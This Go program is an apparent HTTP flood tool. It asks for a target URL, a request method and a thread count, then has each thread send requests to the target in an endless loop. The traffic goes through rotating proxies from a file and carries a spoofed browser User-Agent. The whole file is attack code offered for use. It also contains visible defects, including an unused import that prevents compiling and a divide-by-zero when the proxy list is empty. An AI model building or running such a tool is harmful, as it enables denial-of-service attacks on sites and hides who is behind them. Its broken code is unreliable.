package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter HTTP method (HEAD or GET): ")
	method, _ := reader.ReadString('\n')
	method = strings.ToUpper(strings.TrimSpace(method))

	fmt.Print("Enter URL: ")
	requestUrl, _ := reader.ReadString('\n')
	requestUrl = strings.TrimSpace(requestUrl)

	fmt.Print("Enter number of threads: ")
	threadBytes, _, _ := reader.ReadLine()
	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))

	// Read proxies from file
	proxyBytes, _ := ioutil.ReadFile("proxies.txt")
	proxies := strings.Split(strings.TrimSpace(string(proxyBytes)), "\n")
	if len(proxies) == 1 && proxies[0] == "" {
		proxies = []string{}
	}

	var wg sync.WaitGroup
	wg.Add(numThreads)

	proxyUsage := make([]int, len(proxies))

	for i := 0; i < numThreads; i++ {
		go func(i int) {
			defer wg.Done()

			for {
				proxyIndex := i % len(proxies)
				proxyStr := proxies[proxyIndex]

				proxyUrl, _ := url.Parse("https://" + proxyStr)
				httpTransport := &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
				client := &http.Client{Transport: httpTransport}

				req, _ := http.NewRequest(method, requestUrl, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")

				_, err := client.Do(req)
				if err != nil {
					fmt.Printf("Proxy %s disconnected, error: %s\n", proxyStr, err)
					// Try to reconnect to the same proxy
					time.Sleep(2 * time.Second)
					_, err := client.Do(req)
					if err != nil {
						fmt.Printf("Reconnection to proxy %s failed, error: %s\n", proxyStr, err)
						// Change to a different proxy
						minUsage := proxyUsage[0]
						minIndex := 0
						for i, usage := range proxyUsage {
							if usage < minUsage {
								minUsage = usage
								minIndex = i
							}
						}
						proxyIndex = minIndex
						proxyStr = proxies[proxyIndex]
						fmt.Printf("Switching to a new proxy: %s\n", proxyStr)
					}
				}
				proxyUsage[proxyIndex]++
			}
		}(i)
	}

	wg.Wait()
}
